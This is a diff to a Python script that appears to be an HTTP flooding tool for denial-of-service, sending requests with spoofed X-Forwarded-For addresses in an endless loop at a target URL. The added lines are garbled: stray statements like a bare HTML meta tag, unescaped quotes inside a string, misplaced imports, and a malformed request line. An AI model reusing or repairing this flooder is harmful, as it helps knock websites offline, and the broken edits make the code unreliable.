@@ -4,6 +4,8 @@ from time import sleep
 import multiprocessing
 import random
 import platform
+http.client.FORBIDDEN
+meta charset="utf-8"
 
 print("Detecting System...")
 sysOS = platform.system()
@@ -17,6 +19,27 @@ if sysOS == "Linux":
     print("No se pudo iniciar el script")
 else:
   print("Su sistema no es Linux, es posible que no pueda ejecutar este script en algunos sistemas")
+  
+  import sys
+
+def progressbar(it, prefix="", size=60, file=sys.stdout):
+    count = len(it)
+    def show(j):
+        x = int(size*j/count)
+        file.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "."*(size-x), j, count))
+        file.flush()
+        file.write("\n")
+    show(0)
+    for i, item in enumerate(it):
+        yield item
+        show(i+1)
+        file.write("\n")
+    file.flush()
+    
+import time
+
+for i in progressbar(range(15), "Computing: ", 40):
+    time.sleep(0.1)
 
 
 def randomip():
@@ -28,7 +51,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "REVERSE " + url + " HTTP/0.1\r\nHost: " + ip + "\r\n"
+  get_host = "CONNECT " + url + " HTTP/1.1 <meta charset="utf-8"> " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
